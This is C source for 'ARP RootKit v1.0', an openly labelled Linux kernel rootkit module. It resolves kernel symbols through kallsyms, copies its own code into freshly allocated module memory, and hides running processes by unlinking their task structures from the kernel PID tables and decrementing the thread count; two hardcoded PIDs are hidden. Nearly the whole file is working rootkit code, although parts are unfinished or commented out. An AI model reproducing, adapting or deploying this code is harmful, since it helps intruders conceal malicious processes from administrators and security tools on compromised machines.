/*
 * ARP RootKit v1.0, a simple rootkit for the Linux Kernel.
 * 
 * Copyright 2018 Abel Romero Pérez aka D1W0U <abel@abelromero.com>
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>. 
 */

char code_start = 0;

#include <linux/moduleloader.h>
#include <linux/set_memory.h>
#include <linux/mman.h>
#include <linux/slab.h>
#include <linux/namei.h>
#include <linux/proc_fs.h>
#include <linux/pid_namespace.h>
#include <linux/kallsyms.h>
#include <linux/rculist.h>
#include <linux/hash.h>
#include <linux/sched/signal.h>
#include <linux/module.h>       /* Needed by all modules */
#include <linux/kernel.h>       /* Needed for KERN_INFO */
#include <linux/init.h>         /* Needed for the macros */
#include <linux/tty.h>          /* For the tty declarations */
#include <linux/version.h> /* For LINUX_VERSION_CODE */
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/fcntl.h>
#include <asm/uaccess.h>
#include <capstone.h>

#define PREFIX_MAX 32
#define LOG_LINE_MAX (1024 - PREFIX_MAX)

const char banner[] = "Hello world";

/*
 * Types
 */
struct pid_list_node {
	pid_t nr;
	struct task_struct *task;
	struct pid_list_node *next;
};

/*
 * Declarations
 */
int hide_pid(pid_t pid);
int unhide_pid(pid_t pid);
void pinfo(const char *fmt, ...);
void vpinfo(const char *fmt, va_list args);
void pid_list_create(void);
void pid_list_destroy(void);
void pid_list_push(pid_t nr, struct task_struct *task);
struct task_struct *pid_list_pop(pid_t nr);
void __unhash_process(struct task_struct *p, bool group_dead);
void __change_pid(struct task_struct *task, enum pid_type type,
            struct pid *new);
void attach_pid(struct task_struct *task, enum pid_type type);
void *readfile(const char *file, size_t *len);
extern char code_end;
void entrypoint(void);
int relocate(void *code, size_t code_len);

int init_module(void)
{
	size_t code_len;
	void *code = NULL, (*run)(void);
	void * (*module_alloc)(size_t len);

	pinfo(banner);

	code_len = &code_end - &code_start;
	//set_memory_rw = kallsyms_lookup_name("set_memory_rw");
	//set_memory_rw((unsigned long)&code_start - PAGE_SIZE, 1);
    //set_memory_rw((unsigned long)&code_start, code_len / PAGE_SIZE);
    //set_memory_rw((unsigned long)&code_start + code_len, 1);

	module_alloc = kallsyms_lookup_name("module_alloc");

	pinfo("lkm: code_end = %p, code_start = %p, code_len = %d", &code_end, &code_start, code_len);
	pinfo("lkm: entrypoint = %p", entrypoint);

	if (module_alloc) {
		code = module_alloc(code_len);
	}

	if (code != NULL) {
		//set_memory_x((unsigned long)code - PAGE_SIZE, 1);
		//set_memory_x((unsigned long)code, code_len / PAGE_SIZE);
		//set_memory_x((unsigned long)code + code_len, 1);
		run = code + ((unsigned long)&entrypoint - (unsigned long)&code_start);
		pinfo("allocated: code = %p, entrypoint = %p", code, run);
		memcpy(code, &code_start, code_len);
		pinfo("code copied");
		relocate(code, code_len);
		//run();

		//kzfree(code);
	} else {
		pinfo("can not allocate memory");
	}

    return 0;
}

void cleanup_module(void)
{
}

int *nr_threads = NULL;
struct pid_list_node *pid_list_head = NULL, *pid_list_tail = NULL;
int (*open)(const char *filename, int flags, umode_t mode);
int (*read)(unsigned int fd, char *buf, size_t count);
int (*newfstat)(unsigned int fd, struct stat *statbuf);
int (*close)(unsigned int fd);

void entrypoint(void) {
    nr_threads = kallsyms_lookup_name("nr_threads");
    open = kallsyms_lookup_name("sys_open");
    read = kallsyms_lookup_name("sys_read");
    newfstat = kallsyms_lookup_name("sys_newfstat");
    close = kallsyms_lookup_name("sys_close");

    //pinfo("pid_hash = %p, pidhash_shift = %d, nr_threads = %d\n", pid_hash, pidhash_shift, nr_threads);

    pid_list_create();

    hide_pid(3924);
    hide_pid(3925);
    //unhide_pid(9311);
}

void cleanup(void) {
    pid_list_destroy();
}

int relocate(void *code, size_t code_len) {
	csh handle;
	cs_insn *insn;
	size_t count;
	
	if (cs_open(CS_ARCH_X86, CS_MODE_64, &handle) != CS_ERR_OK) {
		pinfo("cs_open() error");
		return -1;
	}

	pinfo("%d\n", code_len);
	size_t func_off = ((unsigned long)&init_module - (unsigned long)&code_start);
	pinfo("func_off = %d", func_off);
	count = cs_disasm(handle, code + func_off, code_len - func_off, (unsigned long)&code_start + func_off, 0, &insn);
	pinfo("%d\n", count);
	if (count > 0) {
		size_t j;
		for (j = 0; j < count; j++) {
			pinfo("0x%"PRIx64":\t%s\t\t%s", insn[j].address, insn[j].mnemonic, insn[j].op_str);
			size_t i;
			for (i = 0; i< insn[j].size; i++) {
				pinfo("%02x", insn[j].bytes[i]);
			}
		}
		cs_free(insn, count);
	} else {
		pinfo("ERROR: Failed to disassemble given code!\n");
		cs_close(&handle);
		return -1;
	}
	cs_close(&handle);

	return 0;
}

int hide_pid(pid_t nr) {
	struct pid *pid;
	struct task_struct *task;
	
	pid = find_vpid(nr);
	if (pid) {
		task = get_pid_task(pid, PIDTYPE_PID);
		if (task) {
			__unhash_process(task, false);
			pid_list_push(nr, task);
			pinfo("find_vpid %p", find_vpid(nr));
			pinfo("Ok");
		
			return 0;
		} else {
			pinfo("task_struct for PID %d not found", nr);
		}
	} else {
		pinfo("PID not found.");
	}

	return -1;
}

int unhide_pid(pid_t nr) {
	struct task_struct *task;

	task = pid_list_pop(nr);
	if (task) {
		attach_pid(task, PIDTYPE_PID);

		pinfo("Ok");

		return 0;
	} else {
		pinfo("task not found");
	}
	
	return -1;
}

void pid_list_push(pid_t nr, struct task_struct *task) {
	struct pid_list_node *node;

	node = kmalloc(sizeof(struct pid_list_node), GFP_KERNEL);
	if (node) {
		pid_list_tail->next = node;
		pid_list_tail = node;
		node->next = NULL;
		node->nr = nr;
		node->task = task;
	} else {
		pinfo("pid_list_push kmalloc");
	}
}

struct task_struct *pid_list_pop(pid_t nr) {
	struct pid_list_node *node, *prev;
	struct task_struct *task;

	prev = node = pid_list_head;
	while(node) {
		if (node->nr == nr) {
			task = node->task;
			prev->next = node->next;
			if (pid_list_tail == node) {
				pid_list_tail = prev;
			}
			kfree(node);

			return task;
		}
		prev = node;
		node = node->next;
	}

	return NULL;
}

void pid_list_create() {
	struct pid_list_node *node;

	node = kmalloc(sizeof(struct pid_list_node), GFP_KERNEL);
	node->next = NULL;
	node->task = NULL;
	node->nr = 0;

	pid_list_head = pid_list_tail = node;
}

void pid_list_destroy() {
	//struct pid_list_node *node, *next;

	//node = pid_list_head;
	while(pid_list_head->next) {
		unhide_pid(pid_list_tail->nr);
	}
	//	next = node->next;
	//	kfree(node);
	//	node = next;
	//}
}

void attach_pid(struct task_struct *task, enum pid_type type)
{
    struct pid_link *link = &task->pids[type];
    hlist_add_head_rcu(&link->node, &link->pid->tasks[type]);
}

void __change_pid(struct task_struct *task, enum pid_type type,
            struct pid *new)
{
    struct pid_link *link;
    struct pid *pid;
    //int tmp;

    link = &task->pids[type];
    pid = link->pid;

    hlist_del_rcu(&link->node);
/*
	link->pid = new;

    for (tmp = PIDTYPE_MAX; --tmp >= 0; )
        if (!hlist_empty(&pid->tasks[tmp]))
            return;

    free_pid(pid);
*/
}

void __unhash_process(struct task_struct *p, bool group_dead)
{
    *nr_threads -= 1;
	__change_pid(p, PIDTYPE_PID, NULL);
/*
    if (group_dead) {
		__change_pid(p, PIDTYPE_PGID, NULL);
		__change_pid(p, PIDTYPE_SID, NULL);

        list_del_rcu(&p->tasks);
        list_del_init(&p->sibling);
        __this_cpu_dec(process_counts);
    }
    list_del_rcu(&p->thread_group);
    list_del_rcu(&p->thread_node);
*/
}

void *readfile(const char *file, size_t *len) {
	int fd;
	void *buf;
	struct stat fd_st;

	mm_segment_t old_fs = get_fs();
	set_fs(KERNEL_DS);
	fd = open(file, O_RDONLY, 0);
	if (fd >= 0) {
		newfstat(fd, &fd_st);
		buf = kmalloc(fd_st.st_size, GFP_KERNEL);
		if (buf) {
			if (read(fd, buf, fd_st.st_size) == fd_st.st_size) {
				*len = fd_st.st_size;
				close(fd);
				return buf;
			} else {
				pinfo("can't read lkm");
			}
		} else {
			pinfo("create_load_info kmalloc error");
		}

		close(fd);
	} else {
		pinfo("can't open lkm");
	}
	set_fs(old_fs);

	return NULL;
}

// from https://github.com/bashrc/LKMPG/blob/master/4.14.8/examples/print_string.c
// from linux-source/kernel/printk/printk.c
void pinfo(const char *fmt, ...) {
    va_list args;

    va_start(args, fmt);
    vpinfo(fmt, args);
    va_end(args);
}

void vpinfo(const char *fmt, va_list args) {
    struct tty_struct *my_tty;
    const struct tty_operations *ttyops;
    static char textbuf[LOG_LINE_MAX];
    char *str = textbuf;
    size_t str_len = 0;

    /*
     * tty struct went into signal struct in 2.6.6
     */
#if ( LINUX_VERSION_CODE <= KERNEL_VERSION(2,6,5) )
    /*
     * The tty for the current task
     */
    my_tty = current->tty;
#else
    /*
     * The tty for the current task, for 2.6.6+ kernels
     */
    my_tty = get_current_tty();
#endif
    ttyops = my_tty->driver->ops;

    /*
     * If my_tty is NULL, the current task has no tty you can print to
     * (ie, if it's a daemon).  If so, there's nothing we can do.
     */
    if (my_tty != NULL) {

		str_len = vscnprintf(str, sizeof(textbuf), fmt, args);

        /*
         * my_tty->driver is a struct which holds the tty's functions,
         * one of which (write) is used to write strings to the tty.
         * It can be used to take a string either from the user's or
         * kernel's memory segment.
         *
         * The function's 1st parameter is the tty to write to,
         * because the same function would normally be used for all
         * tty's of a certain type.  The 2nd parameter controls
         * whether the function receives a string from kernel
         * memory (false, 0) or from user memory (true, non zero).
         * BTW: this param has been removed in Kernels > 2.6.9
         * The (2nd) 3rd parameter is a pointer to a string.
         * The (3rd) 4th parameter is the length of the string.
         *
         * As you will see below, sometimes it's necessary to use
         * preprocessor stuff to create code that works for different
         * kernel versions. The (naive) approach we've taken here
         * does not scale well. The right way to deal with this
         * is described in section 2 of
         * linux/Documentation/SubmittingPatches
         */
        (ttyops->write) (my_tty,      /* The tty itself */
#if ( LINUX_VERSION_CODE <= KERNEL_VERSION(2,6,9) )
                         0,   /* Don't take the string
                                 from user space        */
#endif
                    	 str, /* String                 */
                         str_len);        /* Length */

        /*
         * ttys were originally hardware devices, which (usually)
         * strictly followed the ASCII standard.  In ASCII, to move to
         * a new line you need two characters, a carriage return and a
         * line feed.  On Unix, the ASCII line feed is used for both
         * purposes - so we can't just use \n, because it wouldn't have
         * a carriage return and the next line will start at the
         * column right after the line feed.
         *
         * This is why text files are different between Unix and
         * MS Windows.  In CP/M and derivatives, like MS-DOS and
         * MS Windows, the ASCII standard was strictly adhered to,
         * and therefore a newline requirs both a LF and a CR.
         */

#if ( LINUX_VERSION_CODE <= KERNEL_VERSION(2,6,9) )
        (ttyops->write) (my_tty, 0, "\015\012", 2);
#else
        (ttyops->write) (my_tty, "\015\012", 2);
#endif
    }
}

char code_end = 0;

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Abel Romero Pérez aka D1W0U <abel@abelromero.com>");
MODULE_DESCRIPTION("A simple Linux Kernel Module RootKit");
MODULE_SUPPORTED_DEVICE("testdevice");
